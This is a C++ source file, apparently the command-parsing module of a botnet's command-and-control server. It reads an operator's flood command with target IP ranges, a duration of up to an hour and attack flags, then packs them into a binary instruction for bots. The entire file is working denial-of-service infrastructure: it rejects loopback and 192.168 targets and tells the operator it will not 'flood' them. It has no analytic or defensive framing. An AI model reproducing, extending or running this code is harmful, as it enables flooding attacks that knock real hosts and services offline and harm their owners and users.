#include <iostream>
#include <string.h>
#include <sstream>
#include <string>
#include <vector>
#include <arpa/inet.h>
#include <iterator>
#include <stdio.h>

#include "command.h"
#include "admin.h"

static int arg_count(std::string input, char find)
{
    int x = 0;
    int o = 0;
    for(x = 0; x < input.size(); x++)
    {
        if(input[x] == find)
        {
            o++;
        }
    }
    return o;
}

struct command *command_process(struct process *process)
{
    struct command *ptr;
    std::stringstream stream;
    std::string out;
    uint8_t *total;
    uint8_t *targets;
    std::string flood;
    std::string n;
    uint8_t num_of_targets = 0;
    std::stringstream gg;
    int u = 0;
    int done = 0;
    uint8_t num_of_flags = 0;
    int g = 0;
    uint8_t *f;
    uint8_t id = 0;
    std::string target;
    uint16_t time = 0;
    std::stringstream error;
    int flag_count = 0;
    int target_count = 0;
    stream << process->buf;
    total = (uint8_t *)malloc(1024);
    if(!total)
    {
        return NULL;
    }
    targets = (uint8_t *)malloc(1024);
    if(!targets)
    {
        free(total);
        return NULL;
    }
    ptr = (struct command *)malloc(sizeof(struct command));
    if(!ptr)
    {
        free(total);
        free(targets);
        return NULL;
    }
    std::getline(stream, out, ' ');
    n = out;
    if(!commands.count(n))
    {
        send(process->fd, "Invalid command\r\n", 17, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    flood = n;
    id = command_ids[flood];
    if(!arg_count(stream.str(), ' '))
    {
        send(process->fd, "Please specify a host\r\n", 23, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    std::getline(stream, out, ' ');
    n = out;
    target = n;
    gg << n;
    while(TRUE)
    {
        std::string str;
        int m = 0;
        uint8_t netmask = 0;
        uint8_t *tmp;
        struct in_addr p;
        uint8_t o1, o2, o3, o4;
        uint32_t host;
        if(!std::getline(gg, str, ','))
        {
            break;
        }
        netmask = 32;
        m = str.find("/");
        if(m != -1)
        {
            std::string x;
            x = str;
            x.erase(0, m + 1);
            netmask = atoi(x.c_str());
            if(netmask > 32 || netmask < 0)
            {
                send(process->fd, "Invalid subnet mask specified, please respecify and try again\r\n", 63, MSG_NOSIGNAL);
                done = 1;
                break;
            }
            if(netmask == 0)
            {
                send(process->fd, "Invalid subnet mask specified, please respecify and try again\r\n", 63, MSG_NOSIGNAL);
                done = 1;
                break;
            }
            str.erase(m, str.length() - m);
        }
        tmp = (uint8_t *)malloc(sizeof(uint32_t) + sizeof(uint16_t));
        if(!tmp)
        {
            done = 1;
            break;
        }
        if(!inet_aton(str.c_str(), &p))
        {
            send(process->fd, "Invalid host specified\r\n", 24, MSG_NOSIGNAL);
            done = 1;
            free(tmp);
            break;
        }
        host = (uint32_t)p.s_addr;
        o1 = host & 0xff;
        o2 = (host >> 8) & 0xff;
        o3 = (host >> 16) & 0xff;
        o4 = (host >> 24) & 0xff;
        if(o1 == 127 || (o1 == 192 && o2 == 168))
        {
            send(process->fd, "Attempted to flood a private address of a internal loop-back address\r\n", 70, MSG_NOSIGNAL);
            done = 1;
            free(tmp);
            break;
        }
        memcpy(tmp, &host, sizeof(uint32_t));
        memcpy(tmp + sizeof(uint32_t), &netmask, sizeof(uint8_t));
        memcpy(targets + u, tmp, sizeof(uint32_t) + sizeof(uint16_t));
        u += sizeof(uint32_t) + sizeof(uint16_t);
        target_count++;
        free(tmp);
    }
    if(done)
    {
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    if(target_count > 255)
    {
        send(process->fd, "No more than 255 targets can be specified at one time\r\n", 55, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    num_of_targets = (uint8_t)target_count;
    if(arg_count(stream.str(), ' ') < 2)
    {
        send(process->fd, "Please specify a time for the flood to end\r\n", 44, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    std::getline(stream, out, ' ');
    n = out;
    time = atoi(n.c_str());
    if(time == 0)
    {
        send(process->fd, "Invalid time specified, please respecify and try again\r\n", 56, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    if(process->ptr->max_time != -1 && time > process->ptr->max_time)
    {
        error << "Invalid time, please specify a duration no greater than " << process->ptr->max_time << " seconds";
        error << "\r\n";
        send(process->fd, error.str().c_str(), error.str().length(), MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    if(time > 3600)
    {
        send(process->fd, "Invalid time, please specify a time no greater than 3600 seconds\r\n", 66, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    time = htons(time);
    while(TRUE)
    {
        int pos = 0;
        std::string key;
        std::string val;
        std::list<uint8_t>::iterator list_iterator;
        std::map<std::string, uint8_t>::iterator flag_iterator;
        int fail = 0;
        uint8_t id;
        int d = 0;
        uint8_t *tmp;
        uint16_t jj = 0;
        uint16_t val_len = 0;
        if(!std::getline(stream, out, ' '))
        {
            break;
        }
        n = out;
        if(n == "?")
        {
            std::stringstream flag_desc_stream;
            for(flag_iterator = flags.begin(); flag_iterator != flags.end(); flag_iterator++)
            {
                for(list_iterator = commands[flood].begin(); list_iterator != commands[flood].end(); list_iterator++)
                {
                    if(flag_iterator->second == *list_iterator)
                    {
                        flag_desc_stream << flag_iterator->first << ":" << " " << flag_description[flag_iterator->first] << "\r\n";
                    }
                }
            }
            send(process->fd, flag_desc_stream.str().c_str(), flag_desc_stream.str().length(), MSG_NOSIGNAL);
            done = TRUE;
            break;
        }
        pos = n.find("=");
        if(pos == -1)
        {
            send(process->fd, "Invalid flag argument\r\n", 23, MSG_NOSIGNAL);
            done = 1;
            break;
        }
        key = n.substr(0, pos);
        val = n.substr(pos + 1);
        if(val.length() > 1024)
        {
            error << "Invalid flag length near " << key;
            error << ", values must have a length no greater than 1024";
            error << "\r\n";
            send(process->fd, error.str().c_str(), error.str().length(), MSG_NOSIGNAL);
            done = 1;
            break;
        }
        if(val.length() == 0)
        {
            error << "Blank flag specified near " << key;
            error << "\r\n";
            send(process->fd, error.str().c_str(), error.str().length(), MSG_NOSIGNAL);
            done = 1;
            break;
        }
        for(list_iterator = commands[flood].begin(); list_iterator != commands[flood].end(); list_iterator++)
        {
            if(flags[key] == *list_iterator)
            {
                fail = 0;
                break;
            }
            fail = 1;
        }
        if(fail)
        {
            error << "Invalid flag specified near " << key;
            error << "\r\n";
            send(process->fd, error.str().c_str(), error.str().length(), MSG_NOSIGNAL);
            done = 1;
            break;
        }
        id = flags[key];
        jj = (uint16_t)val.length();
        tmp = (uint8_t *)malloc(sizeof(uint8_t) + sizeof(uint16_t) + jj);
        if(!tmp)
        {
            done = 1;
            break;
        }
        val_len = htons(jj);
        tmp[0] = id;
        memcpy(tmp + sizeof(uint8_t), &val_len, sizeof(uint16_t));
        memcpy(tmp + sizeof(uint8_t) + sizeof(uint16_t), val.c_str(), jj);
        memcpy(total + g, tmp, sizeof(uint8_t) + sizeof(uint16_t) + jj);
        g += sizeof(uint8_t) + sizeof(uint16_t) + jj;
        flag_count++;
        free(tmp);
    }
    if(done)
    {
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    if(flag_count > 255)
    {
        send(process->fd, "No more than 255 flags can be specified at one time\r\n", 53, MSG_NOSIGNAL);
        free(ptr);
        free(total);
        free(targets);
        return NULL;
    }
    num_of_flags = (uint8_t)flag_count;
    f = (uint8_t *)malloc(sizeof(uint8_t) + sizeof(uint16_t) + sizeof(uint8_t) + u + sizeof(uint8_t) + g);
    if(!f)
    {
        free(total);
        free(targets);
        free(ptr);
        return NULL;
    }
    memcpy(f, &id, sizeof(uint8_t));
    memcpy(f + sizeof(uint8_t), &time, sizeof(uint16_t));
    memcpy(f + sizeof(uint8_t) + sizeof(uint16_t), &num_of_targets, sizeof(uint8_t));
    memcpy(f + sizeof(uint8_t) + sizeof(uint16_t) + sizeof(uint8_t), targets, u);
    memcpy(f + sizeof(uint8_t) + sizeof(uint16_t) + sizeof(uint8_t) + u, &num_of_flags, sizeof(uint8_t));
    memcpy(f + sizeof(uint8_t) + sizeof(uint16_t) + sizeof(uint8_t) + u + sizeof(uint8_t), total, g);
    free(total);
    free(targets);
    time = ntohs(time);
    ptr->buf = f;
    ptr->buf_len = sizeof(uint8_t) + sizeof(uint16_t) + sizeof(uint8_t) + u + sizeof(uint8_t) + g;
    return ptr;
}
